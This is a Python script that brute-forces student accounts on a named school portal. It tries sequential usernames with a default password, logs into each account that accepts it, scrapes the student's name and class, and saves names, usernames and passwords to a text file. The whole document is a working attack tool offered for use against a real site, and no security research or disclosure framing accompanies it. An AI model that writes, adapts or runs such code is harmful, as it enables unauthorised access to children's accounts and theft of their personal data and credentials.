from bs4 import BeautifulSoup
import json
import requests
from student import Student
# Start the session
session = requests.Session()

# Create the payload

successFullLogins = []


def tryWithPwd(username, pwd):
    payload = {'username': username,
               'password': pwd}

    # Post the payload to the site to log in
    for i in range(1, 1000):  # max 1000 children/class
        username += 1
        payload['username'] = username
        # payload['password'] = username
        response = session.post(
            "https://dpsharidwar.edunexttech.com/SignUp", data=payload)
        response = response.text.replace(
            "\'", "\"")  # conversion to a valid json
        # print(response)
        response = json.loads(response)
        if(response['status'] == 'successful'):

            # Getting name and class-section
            response = session.get(
                "https://dpsharidwar.edunexttech.com/StudentDashboardApp/StudentQuickDashboard")
            soup = BeautifulSoup(response.text, 'html.parser')
            name = soup.find(
                'h2', {'class': 'customtext m-t-0 m-b-6 std-name common-color'}).text
            classAndSection = soup.find(
                'span', {'class': 'text-size-mini'}).text
            s = Student(name, classAndSection,
                        payload['username'], payload['password'])
            successFullLogins.append(s)
            print("Found", s.username, s.name, s.classAndSection, end="\n")
        else:
            print("Not found", username)    


def saveUsernames():
    with open('usernames.txt', 'w') as f:
        for s in successFullLogins:
            strS = f'Name: {s.name}\nClass: {s.classAndSection}\nUsername: {s.username}\nPassword: {s.password}\n\n'
            f.write(strS)


if __name__ == '__main__':
    print("Bruteforcing username...")
    tryWithPwd(20100000, 'student123')
    print("Successfully found", len(successFullLogins), "usernames")
    saveUsernames()
